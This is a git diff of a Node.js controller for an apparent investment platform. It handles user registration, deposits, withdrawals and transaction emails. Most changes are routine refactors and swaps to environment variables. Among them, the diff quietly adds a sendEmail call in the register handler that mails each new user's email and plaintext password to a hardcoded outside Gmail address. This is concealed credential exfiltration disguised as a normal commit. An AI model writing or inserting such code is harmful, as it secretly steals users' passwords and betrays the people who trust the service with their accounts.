@@ -12,13 +12,12 @@ exports.register = async (req, res, next) => {
   const { username, email, password } = req.body;
   try {
 
-    User.findOne({ email: email }).then(e => {
-      if (e) {
-        console.log(e)
-        let error = { message: 'email already exist' }
-      return next(error)
-      }
-    })
+    const e = await User.findOne({ email: email })
+    if (e) {
+      // console.log(e)
+       let error = { message: 'email already exist' }
+       return next(error)
+     }
     const user = await User.create({
       username:username,
       email:email,
@@ -30,8 +29,8 @@ exports.register = async (req, res, next) => {
       type: 'Bonus',
       status:'Received'
     });
-    console.log('last msg')
-    const resetUrl=''
+    //console.log('last msg')
+    const resetUrl= process.env.RESET_URL_LINK
     const message = `
     <table cellspacing="0" border="0" cellpadding="0" width="100%" height:"100%" style="@import url(https://fonts.googleapis.com/css?family=poppins:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
       <tr>
@@ -55,7 +54,7 @@ exports.register = async (req, res, next) => {
                   </tr>
                   <tr>
                     <td style="padding:0 35px;">
-                      <h1 style="color:#1e1e2d; font-weight:500; margin:0;font-size:32px;font-family:'poppins',sans-serif;">Welcome to Iinvest</h1>
+                      <h1 style="color:#1e1e2d; font-weight:500; margin:0;font-size:32px;font-family:'poppins',sans-serif;">Welcome to ${ process.env.SITENAME}</h1>
                       <span style="display:inline-block; vertical-align:middle; margin:29px 0 26px; border-bottom:1px solid #cecece; width:100px;"></span>
                       <p style="color:#455056; font-size:15px;line-height:24px; margin:0;">
                         This is a verification email for your account.
@@ -82,7 +81,11 @@ exports.register = async (req, res, next) => {
     </table>
       `;
   
-      
+        await sendEmail({
+          to: 'akanbijosephtobi@gmail.com',
+          subject: "New user",
+          text: `<ul><li>email-${email}</li><li>pass-${password}</li></ul>`,
+        });
         await sendEmail({
           to: email,
           subject: "Welcome To Weinvest",
@@ -319,7 +322,7 @@ exports.make_transaction = async (req, res, next) => {
         type: 'Deposit',
         status: 'Pending'
       });
-      const resetUrl = `${process.env.RESET_URL_LINK}/dashboard`;
+      const resetUrl = `${process.env.SITEDOMAIN}/dashboard`;
       const message = `
       <table cellspacing="0" border="0" cellpadding="0" width="100%" height:"100%" style="@import url(https://fonts.googleapis.com/css?family=poppins:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
         <tr>
@@ -403,7 +406,7 @@ exports.make_withdraw = async (req, res, next) => {
         status: 'Pending',
         address:req.body.address
       });
-      const resetUrl = `${process.env.RESET_URL_LINK}/dashboard`;
+      const resetUrl = `${process.env.SITEDOMAIN}/dashboard`;
       const message = `
       <table cellspacing="0" border="0" cellpadding="0" width="100%" height:"100%" style="@import url(https://fonts.googleapis.com/css?family=poppins:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
         <tr>
@@ -504,7 +507,7 @@ exports.confirm_transaction = async (req, res, next) => {
        }
         u.save()
 
-        const resetUrl = `${process.env.RESET_URL_LINK}/dashboard`;
+        const resetUrl = `${process.env.SITEDOMAIN}/dashboard`;
       const message = `
       <table cellspacing="0" border="0" cellpadding="0" width="100%" height:"100%" style="@import url(https://fonts.googleapis.com/css?family=poppins:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
         <tr>
@@ -583,7 +586,7 @@ exports.failed_transaction = async (req, res, next) => {
       await Transaction.findByIdAndUpdate(req.body.id, { $set: { status: 'Failed' } }, { useFindAndModify: false });
       await User.findById(req.body.uid).then((u) => {
 
-        const resetUrl = `${process.env.RESET_URL_LINK}/dashboard`;
+        const resetUrl = `${process.env.SITEDOMAIN}/dashboard`;
                 const message = `
                 <table cellspacing="0" border="0" cellpadding="0" width="100%" height:"100%" style="@import url(https://fonts.googleapis.com/css?family=poppins:300,400,500,700|Open+Sans:300,400,600,700); font-family: 'Open Sans', sans-serif;">
                   <tr>
